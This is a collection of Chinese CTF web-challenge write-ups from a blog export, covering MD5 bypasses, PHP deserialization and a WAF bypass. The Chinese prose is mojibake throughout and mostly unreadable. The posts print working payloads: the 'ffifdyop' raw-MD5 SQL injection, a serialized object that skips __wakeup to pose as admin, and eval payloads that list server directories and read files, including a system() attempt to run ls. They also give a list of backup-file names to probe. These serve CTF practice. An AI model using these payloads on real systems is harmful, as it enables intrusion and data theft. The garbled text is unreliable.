å®ƒè¦æ±‚æˆ‘ä»¬ä¸¤ç»„å‚æ•°çš„å€¼è¦ä¸ç›¸ç­‰ï¼Œä½†md5ç¼–ç åçš„å€¼ç›¸ç­‰ æˆ‘ä»¬ä¹‹å‰æœ‰åšè¿‡md5ç»•è¿‡ï¼Œå¼±ç­‰äºåˆ¤æ–­ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡md5ã€‚å› ä¸ºmd5æ— æ³•ç¼–ç æ•°ç»„ï¼Œä¼šè¿”å›nullã€‚ æ„é€ ç¬¬ä¸€ä¸ªpayloadï¼š?id[]=1&amp;gg[]=2 å†çœ‹ç¬¬äºŒä¸ªåˆ¤æ–­è¯­å¥ï¼šif ( !is_numeric($passwd) ) if( $passwd==1234567 )ä»–è¦æ±‚æˆ‘ä»¬POSTçš„å‚æ•°passwdçš„å€¼ç±»å‹ä¸ä¸ºæ•°å­—ï¼Œä½†æ˜¯åˆåˆ¤æ–­passwdçš„å€¼æ˜¯éƒ½ç­‰äº1234567ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¼±ç­‰äºç»•è¿‡ æ„é€ ç¬¬äºŒä¸ªpayloadï¼špassword=1234567a æœ€åï¼Œé€šè¿‡hackbarä¸Šä¼ æˆ‘ä»¬çš„payloadå³å¯è·å–flag [BJDCTF2020]Easy MD5æ‰“å¼€å®¹å™¨ï¼Œå‘ç°å°±ä¸€ä¸ªæŸ¥è¯¢æ¡†ï¼ŒæŸ¥çœ‹æºç æ²¡å‘ç°ä»€ä¹ˆé‡è¦çš„ä¿¡æ¯ã€‚ éšæœºè¾“å…¥æ•°å­—1ï¼Œå‘ç°æ²¡ä»€ä¹ˆå›æ˜¾ï¼Œä½†æ˜¯çœ‹åˆ°URLæ è·³å‡ºpasswd=1 å°è¯•æŠ“åŒ…ï¼š å‘ç°å›æ–‡ä¸­è—ç€hintâ€”â€”å°†æˆ‘ä»¬è¾“å…¥ä¸Šä¼ çš„passwdç»è¿‡md5ç¼–ç åå¸¦å…¥sqlæŸ¥è¯¢è¯­å¥ã€‚ è¿™é‡Œä»‹ç»ä¸€ä¸‹md5()å‡½æ•°ï¼š è¯­æ³•ï¼šmd5(string,raw) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚ raw å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼š TRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•° **sp:**åŸå§‹äºŒè¿›åˆ¶æ•°æ®ä¸æ˜¯æŒ‡0101è¿™äº›äºŒè¿›åˆ¶æ•°æ®ï¼Œè€Œæ˜¯åŸå§‹å­—ç¬¦ä¸²è½¬æ¢æˆasciiç åç»„æˆçš„å­—ç¬¦ä¸²ã€‚ å…³äºmd5è¾“å‡ºåŸå§‹äºŒè¿›åˆ¶çš„è½¬æ¢è¿‡ç¨‹å’Œæœºåˆ¶å‚è€ƒåšå®¢ï¼šhttps://www.7gugu.com/2020/01/15/%E6%8E%A2%E7%A9%B6php%E7%9A%84md5%E5%87%BD%E6%95%B0%E8%BE%93%E5%87%BA%E7%9A%84%E5%8E%9F%E5%A7%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%98%AF%E5%95%A5/ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æç¤ºè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„passwdç»è¿‡md5ç¼–ç åè¦ç­‰äºçœŸçš„å¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬æ€ä¹ˆä¼šçŸ¥é“å¯†ç å‘¢ï¼Œé‚£ä¹ˆå…³é”®ç‚¹è‚¯å®šå°±æ˜¯åœ¨md5ä¸Šã€‚é€šè¿‡æŸ¥é˜…èµ„æ–™æˆ‘ä»¬å¾—çŸ¥å¯ä»¥ä½¿ç”¨ffifdyopç»•è¿‡ï¼Œå…¶ç»è¿‡md5(ffifdyop,raw)åä¸º&#39;or&#39;6xxxxxxxxxxï¼› å¸¦å…¥sqlè¯­å¥ä¸­ä¸ºï¼šselect * from &#39;admin&#39; where password=&#39;&#39;or&#39;6xxxxxxxxxx&#39;ï¼Œä¹Ÿå°±æ˜¯è¯´æ„æˆäº†ä¸€å¥ç”¨çœŸå¼ã€‚é‚£ä¹ˆè¿™æ—¶å¸¦å…¥æ•°æ®åº“ä¸­å°±ä¸ä¼šè¿”å›ç©ºäº†ã€‚ è¾“å…¥ffifdyopåè·³è½¬åˆ°ä¸€ä¸ªæ–°çš„é¡µé¢ï¼ŒæŸ¥çœ‹æºç ï¼š 1234567&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; // wow, glzjin wants a girl friend.--&gt; è¿™é‡Œæˆ‘ä»¬ç”¨æ•°ç»„ç»•è¿‡md5å³å¯ï¼Œæ„é€ payloadï¼š?a[]=a&amp;b[]=b ç»•è¿‡ æœ‰è·³è½¬åˆ°å¦ä¸€ä¸ªé¡µé¢ï¼Œåˆæ˜¯ä¸€ä¸²ä»£ç ï¼š 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; è¿™é‡Œæˆ‘ä»¬ä¾æ—§é‡‡ç”¨æ•°ç»„ç»•è¿‡md5å³å¯ï¼š éœ€è¦æ³¨æ„çš„æ˜¯åé¢ä¸€ä¸ªç­‰å·æ˜¯å¼ºç­‰äºï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸èƒ½ä½¿ç”¨å“ˆå¸Œç¢°æ’æ¥ç»•è¿‡md5ã€‚å› ä¸ºPHPå¼ºç­‰äºæ—¶å°±ä¸ä¼šæŠŠä»¥0Eå¼€å¤´çš„å“ˆå¸Œå€¼è§£é‡Šä¸º0ã€‚ spï¼šæœ€è¿‘è¿˜åšäº†è›®å¤šmd5ç»•è¿‡çš„é¢˜ï¼Œæœ‰ä¸€ä¸ªå…³äºmd5ç»•è¿‡çš„åšå®¢å†™çš„æŒºå…¨é¢çš„ï¼šhttps://blog.csdn.net/CSDNiamcoming/article/details/108837347","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","date":"2021-05-22T02:37:59.000Z","path":"2021/05/22/åºåˆ—åŒ–ä¸ååºåˆ—åŒ–/","text":"åºåˆ—å’Œååºåˆ—åŒ–ï¼šç®€å•æ¥è¯´ï¼š åºåˆ—åŒ–â€”â€”å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ã€‚ ååºåˆ—åŒ–â€”â€”å°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ã€‚ å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼š1234567_construct()ï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–_destruction()ï¼šç»“æŸæ—¶é”€æ¯å¯¹è±¡_toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶ä½¿ç”¨_sleep()ï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨_wakeup()ï¼šååºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨_call()ï¼šè°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨æ—¶ä½¿ç”¨_get()ï¼šè°ƒç”¨ç§æœ‰å±æ€§æ—¶ä½¿ç”¨ å¸¸è§çš„è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦12345public(å…¬æœ‰)protected(å—ä¿æŠ¤)private(ç§æœ‰çš„)protectedå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00*%00å±æ€§åprivateå±æ€§è¢«åºåˆ—åŒ–çš„æ—¶å€™å±æ€§å€¼ä¼šå˜æˆï¼š%00ç±»å%00å±æ€§å åºåˆ—åŒ–ä¸­æ¯ä¸ªå­—æ¯çš„è¡¨ç¤º a arrayæ•°ç»„ b booleanåˆ¤æ–­ç±»å‹ d doubleæµ®ç‚¹æ•° i integeræ•´æ•°å‹ o common object ä¸€èˆ¬çš„å¯¹è±¡ r referenceå¼•ç”¨ç±»å‹ s stringå­—ç¬¦ä¸²ç±»å‹ C custom object O class N null R pointer reference U unicode string å€Ÿé˜…èµ„æ–™ï¼š https://blog.csdn.net/bmth666/article/details/104737025","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf3","date":"2021-05-21T13:20:13.000Z","path":"2021/05/21/buuctf3/","text":"[æŠ¤ç½‘æ¯ 2018]easy_tornado[æå®¢å¤§æŒ‘æˆ˜ 2019]HttpæŸ¥çœ‹æºç ï¼š è®¿é—®Secret.php è¿™é¢˜åº”è¯¥æ˜¯ä¼ªé€ HTTPåè®®ï¼ŒburpæŠ“åŒ…ï¼Œä¼ªé€ Refererï¼š ä»–è¦æ±‚æˆ‘ä»¬ç”¨Sycloverï¼Œä¼ªé€ User-Agentï¼š ä»–åˆè¦æ±‚åªèƒ½æœ¬åœ°è®¿é—®ï¼Œä¼ªé€ X-Forwarded-Forï¼š [æå®¢å¤§æŒ‘æˆ˜ 2019]PHPæ‰“å¼€å®¹å™¨ï¼š å‘ç°è¿™æ ·ä¸€å¥è¯ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œç”¨dirsearchæ‰«æä¸€ä¸‹ï¼Œä½†æ˜¯è¿™ä¸ªç½‘å€çš„æœåŠ¡å™¨å¯èƒ½åšå¾—ä¸å¤§å¥½ä¼šæ‰«å´©ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥æ‰‹å·¥æµ‹è¯•ä¸€ä¸‹ã€‚å°è¯•www.zipï¼š![image-20210522105338750](buuctf3.assets/image-20210522105338750.png) æŸ¥é˜…æœ‰å‘ç°å°±ä¸¤ä¸ªæ–‡ä»¶æœ‰ç”¨ï¼š class.phpï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpinclude &#x27;flag.php&#x27;;error_reporting(0);class Name&#123; private $username = &#x27;nonono&#x27;; private $password = &#x27;yesyes&#x27;; public function __construct($username,$password)&#123; $this-&gt;username = $username; $this-&gt;password = $password; &#125; function __wakeup()&#123; $this-&gt;username = &#x27;guest&#x27;; &#125; function __destruct()&#123; if ($this-&gt;password != 100) &#123; echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); &#125; if ($this-&gt;username === &#x27;admin&#x27;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; index.php: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;I have a cat!&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;meyer-reset&#x2F;2.0&#x2F;reset.min.css&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt;&lt;&#x2F;head&gt;&lt;style&gt; #login&#123; position: absolute; top: 50%; left:50%; margin: -150px 0 0 -150px; width: 300px; height: 300px; &#125; h4&#123; font-size: 2em; margin: 0.67em 0; &#125;&lt;&#x2F;style&gt;&lt;body&gt;&lt;div id&#x3D;&quot;world&quot;&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;å› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯ &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;ä¸æ„§æ˜¯æˆ‘ï¼ï¼ï¼ &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt; &lt;?php include &#39;class.php&#39;; $select &#x3D; $_GET[&#39;select&#39;]; $res&#x3D;unserialize(@$select); ?&gt; &lt;&#x2F;div&gt; &lt;div style&#x3D;&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align&#x3D;&quot;center&quot; style&#x3D;&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;&#x2F;p&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;three.js&#x2F;r70&#x2F;three.min.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;http:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;gsap&#x2F;1.16.1&#x2F;TweenMax.min.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;OrbitControls.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&#39;https:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;s.cdpn.io&#x2F;264161&#x2F;Cat.js&#39;&gt;&lt;&#x2F;script&gt;&lt;script src&#x3D;&quot;index.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å…¶ä¸­å…³é”®çš„ä»£ç æ®µï¼š 12345&lt;?phpinclude &#x27;class.php&#x27;;$select = $_GET[&#x27;select&#x27;];$res=unserialize(@$select);?&gt; è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ï¼Œå½“username=adminï¼Œpassword=100æ—¶è¾“å‡ºflagã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªéº»çƒ¦ï¼Œ__wakeup()é­”æœ¯æ–¹æ³•ä¼šåœ¨ååºåˆ—åŒ–å‰è·³å‡ºæ¥æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯usernameè¢«èµ‹å€¼guestï¼Œå°±ç ´åäº†è¾“å‡ºflagçš„æ¡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•ç»•è¿‡__wakeup()é­”æœ¯æ–¹æ³•ï¼šåœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œå±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ __wakeup()å‡½æ•°çš„æ‰§è¡Œã€‚ æˆ‘ä»¬å°è¯•æ„é€ payloadï¼š ?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; è¿™é‡Œè¦æ³¨æ„ï¼šç”±äºè¿™é‡Œçš„usernameå’Œpasswordå±äºprivateå˜é‡ï¼ˆprivate å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚ï¼‰ï¼Œå› æ­¤åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šåœ¨å­—æ®µåå‰é¢å¢åŠ æ‰€å±ç±»åï¼Œå¹¶ä¸”ç±»åå’Œå­—æ®µåå‰è¦åŠ å‰ç¼€0ã€‚ [RoarCTF 2019]Easy Calcæ‰“å¼€å®¹å™¨ï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ªè®¡ç®—æœºï¼ŒæŸ¥çœ‹ä¸€ä¸‹æºç ï¼š ç°åœ¨æˆ‘ä»¬çŸ¥é“æœåŠ¡å™¨ç«¯å­˜åœ¨ä¸€ä¸ªWAFï¼› æˆ‘ä»¬å…ˆè®¿é—®ä¸€ä¸‹calc.phpï¼š æˆ‘ä»¬çœ‹åˆ°ä»–è¿‡æ»¤äº†ä¸€äº›ç¬¦å·ï¼ŒåŒæ—¶åˆ©ç”¨numä¼ å‚ è¿™é‡Œæˆ‘ä»¬è¦å¼•å…¥ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypassæˆ‘ä»¬çŸ¥é“PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ï¼›å…¶ä¸­%20è¢«åˆ é™¤[è¢«ä¸‹åˆ’çº¿æ›¿æ¢ã€‚ å¦‚æœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š /news.php?%20news[id%00=a å› ä¸ºæ­¤æ—¶çš„å˜é‡åæ˜¯%20new[idï¼Œè€ŒWAFè¯†åˆ«çš„å˜é‡åæ˜¯new_idï¼Œå½“phpè§£ææ—¶ä¼šå°†%20å’Œ[åˆ å»ï¼Œå°†%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚ PHPçš„å­—ç¬¦ä¸²è§£æå¯¹éƒ¨åˆ†å­—ç¬¦çš„æ“ä½œï¼š ç¬¦å· æ“ä½œ . ä¸‹åˆ’çº¿æ›¿æ¢ [ ä¸‹åˆ’çº¿æ›¿æ¢ %20ï¼ˆ ï¼‰ åˆ é™¤ + åˆ é™¤ æˆ‘ä»¬çœ‹åˆ°ç”±äºå­˜åœ¨eval()å‡½æ•°ï¼Œå› æ­¤å­˜åœ¨eval()ä»£ç æ‰§è¡Œæ¼æ´ï¼š PHPå‡½æ•°ï¼šğŸŒ¸scandir()ï¼šä»¥æ•°ç»„å½¢å¼è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ğŸŒ¸var_dump()ï¼šè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚ğŸŒ¸file_get_contents()ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚ æ€»ç»“:æˆ‘ä»¬é€šè¿‡PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡é˜²ç«å¢™ï¼Œåˆ©ç”¨eval()ä»£ç æ‰§è¡Œæ¼æ´è·å–flag æ„é€ paylaodï¼š æ‰«ææœåŠ¡å™¨æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼šcalc.php? num=var_dump(scandir(chr(47))) è·å–flaggæ–‡ä»¶çš„å†…å®¹ï¼šcalc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) ï¼Ÿç–‘é—®ï¼šä¸ºä»€ä¹ˆcalc.php?+num=var_dump(system(chr(96).chr(108).chr(115).chr(96)))æ— æ³•è·å–æœåŠ¡å™¨åº•ä¸‹ç›®å½• å‚è€ƒèµ„æ–™ï¼š https://www.icode9.com/content-4-703121.html https://www.freebuf.com/articles/web/213359.html","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"åšé¢˜æ€è·¯","date":"2021-05-13T11:30:19.000Z","path":"2021/05/13/webåšé¢˜æ€è·¯/","text":"å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š .index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.1index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gz.index.php.swowww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"ISCC","date":"2021-05-04T04:23:03.000Z","path":"2021/05/04/2021ISCC/","text":"webï¼šISCCå®¢æœå†²å†²å†²ï¼ˆä¸€ï¼‰â€”â€”å…³äºjså‰ç«¯æ‰“å¼€å®¹å™¨ï¼š å‘ç°å³è¾¹é‚£ä¸ªä¼šè‡ªåŠ¨åŠ ç¥¨ï¼Œè€Œä¸”åŠ çš„éå¸¸å¿«ï¼Œå¦‚æœæ‰‹åŠ¨ç‚¹å‡»20ç§’å†…è‚¯å®šå¹²ä¸è¿‡ æ ¹æ®ç»éªŒè¿™ç§é¢˜è‚¯å®šæ˜¯å‰ç«¯çš„é¢˜ï¼ŒF12æ‰“å¼€æ§åˆ¶å™¨ï¼ŒæŸ¥çœ‹æºç  åˆ é™¤ç®­å¤´æ‰€æŒ‡ä¸€è¡Œä»£ç ï¼Œè¿™æ ·å°±æ²¡åŠæ³•ç»™å‡çš„å®¢æœå·ç¥¨ï¼Œç„¶ååœ¨å€’è®¡æ—¶å†…ç–¯ç‹‚ç»™çœŸçš„å®¢æœæŠ•ç¥¨å°±å¥½äº†ã€‚ webï¼šè¿™æ˜¯å•¥â€”â€”jsfuckæ‰“å¼€å®¹å™¨ï¼š æŸ¥çœ‹æºç ï¼š å‘ç°äº†ä¸€å¤§ä¸²è¿™ç§ç¬¦å·ï¼Œå› ä¸ºä¹‹å‰æœ‰åšè¿‡ç±»ä¼¼çš„ï¼ŒçŸ¥é“è¿™æ˜¯jsfuckç¼–ç ã€‚ç›´æ¥å¤åˆ¶ï¼Œç²˜è´´åœ¨æ§åˆ¶å°ä¸Šå›è½¦æ‰§è¡Œ webï¼šWeb01â€”â€”robotsæ–‡ä»¶+æ­£åˆ™åŒ¹é…æ‰“å¼€å®¹å™¨ï¼š æŸ¥çœ‹robots.txt æ¥ç€è®¿é—®/src/code/code.txtï¼Œè·³å‡º404ï¼Œç„¶åæˆ‘è¯•ç€æŠŠ/srcåˆ æ‰ï¼Œç»“æœå°±å¯ä»¥äº†ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘é—®äº†å¤§ä½¬ï¼Œè¿™ä¸ªsrcå°±ä»£æŒ‡äº†ä¸Šé¢çš„ipï¼Œå› æ­¤æˆ‘ä»¬åªè¦è¾“å…¥/code/code.txtå°±å¥½äº† ä»£ç å®¡è®¡ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é€šè¿‡?passwordä¼ å‚ï¼Œå…ˆåˆ¤æ–­passwordçš„å€¼æ˜¯å¦ä¸ºæ˜¯æ—¢å«æ•°å­—åˆå«å­—æ¯çš„ï¼Œæ¥ç€åˆ¤æ–­ä¼ å‚çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦è¶…è¿‡8ï¼ŒåŒæ—¶ä¼ å‚çš„å€¼æ˜¯å¦å¤§äº9999999ï¼Œæœ€ååˆ¤æ–­å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨*-* é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨ç†æ¸…ä¸€ä¸‹è¦æ»¡è¶³çš„æ¡ä»¶ï¼š 1.è¦æ—¢å«å­—æ¯åˆå«å­—ç¬¦ä¸² 2.é•¿åº¦ä¸å¾—è¶…è¿‡8ï¼Œä¸”å€¼å¿…é¡»å¤§äº9999999â€”â€”ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ 3.å­˜åœ¨*-* é‚£ä¹ˆå¯¹åº”çš„payloadï¼š1e8*-* webï¼šç™»å½•â€”â€”ç½‘ç«™å¤‡ä»½æ–‡ä»¶æ³„éœ²+ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸åˆšåˆšæ‰“å¼€å®¹å™¨è¿˜ä»¥ä¸ºè¿™æ˜¯ä¸€é“SQLæ³¨å…¥é¢˜ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¼šåæ„Ÿè§‰ä¸å¯¹åŠ²ï¼Œå°è¯•ç”¨dirsearchæ‰«æä¸€ä¸‹æœåŠ¡å™¨ç«¯å£ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰å¥½å‡ ä¸ªphpæ–‡ä»¶ï¼Œä½†æ˜¯å‰ä¸‰ä¸ªæ–‡ä»¶æ‰“å¼€åéƒ½æ˜¯ç©ºç™½æ–‡ä»¶ï¼Œå°è¯•æ‰“å¼€ç¬¬å››ä¸ª ï¼ˆspï¼šç½‘ç«™çš„æ–‡ä»¶éƒ½æ˜¯æ”¾ç½®åœ¨wwwæ–‡ä»¶å¤¹ä¸‹é¢çš„ï¼Œzipæ˜¯ä¸€ç§å‹ç¼©æ ¼å¼ã€‚ä¹Ÿå°±æ˜¯WWWæ–‡ä»¶å¤¹é‡Œé¢çš„æ–‡ä»¶å…¨éƒ¨å‹ç¼©åœ¨www.zipé‡Œé¢äº†ã€‚ï¼‰ ä¸€ ä¸€æ‰“å¼€æ–‡ä»¶è¿›è¡Œä»£ç å®¡è®¡ä¸€ä¸‹ï¼š class.phpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET 